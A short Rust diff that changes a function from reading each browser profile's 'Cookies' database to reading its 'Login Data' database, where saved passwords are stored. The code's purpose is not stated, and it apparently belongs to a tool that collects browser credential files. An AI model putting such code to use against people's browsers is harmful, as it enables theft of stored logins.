@@ -1,6 +1,6 @@
 use std::path::PathBuf;
 
-pub(super) async fn get_cookies(
+pub(super) async fn get_login_data(
     path: &mut PathBuf,
     profiles: &Vec<String>,
     tempfile: &PathBuf,
@@ -8,10 +8,7 @@ pub(super) async fn get_cookies(
 ) -> std::io::Result<()> {
     for profile in profiles {
         path.push(profile);
-        if cfg!(target_os = "windows") {
-            path.push("/Network");
-        }
-        path.push("/Cookies");
+        path.push("/Login Data");
 
         super::check_db_size(path).await?;
 
@@ -20,9 +17,6 @@ pub(super) async fn get_cookies(
 
         std::fs::remove_file(tempfile).unwrap();
         path.pop();
-        if cfg!(target_os = "windows") {
-            path.pop();
-        }
         path.pop();
     }
 
